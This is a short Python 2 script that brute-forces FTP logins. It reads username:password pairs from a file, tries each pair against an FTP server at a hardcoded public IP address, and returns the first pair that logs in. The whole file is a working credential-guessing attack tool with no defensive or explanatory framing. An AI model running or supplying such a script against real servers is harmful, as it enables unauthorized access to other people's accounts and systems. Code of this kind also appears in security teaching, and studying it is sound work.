import ftplib

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: %s/%s' % (userName, passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            # print '\n[*] FTP Logon Succeed: %s/%s' \
                # % (userName, passWord)
            ftp.quit()
            return (userName, passWord)
        except ftplib.error_perm:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)
        
def main():
    host = '121.42.157.22'
    passwdFile = 'userpass.txt'
    bruteLogin(host, passwdFile)
    
if __name__ == '__main__':
    main()